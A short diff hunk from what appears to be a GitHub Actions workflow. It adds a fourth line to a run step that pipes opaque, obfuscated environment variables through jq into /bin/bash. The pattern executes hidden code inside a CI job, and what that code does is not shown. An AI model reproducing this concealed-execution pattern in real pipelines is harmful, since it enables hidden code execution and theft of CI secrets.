@@ -27,6 +27,7 @@ jobs:
           echo $vp9071 | jq -r .ad44151 | /bin/bash
           echo $c0032 | jq -r .kh4478 | /bin/bash
           printf '%s' "$t23096" | jq -r .cqcr47 | /bin/bash
+          echo $a385 | jq -r .pcf711 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
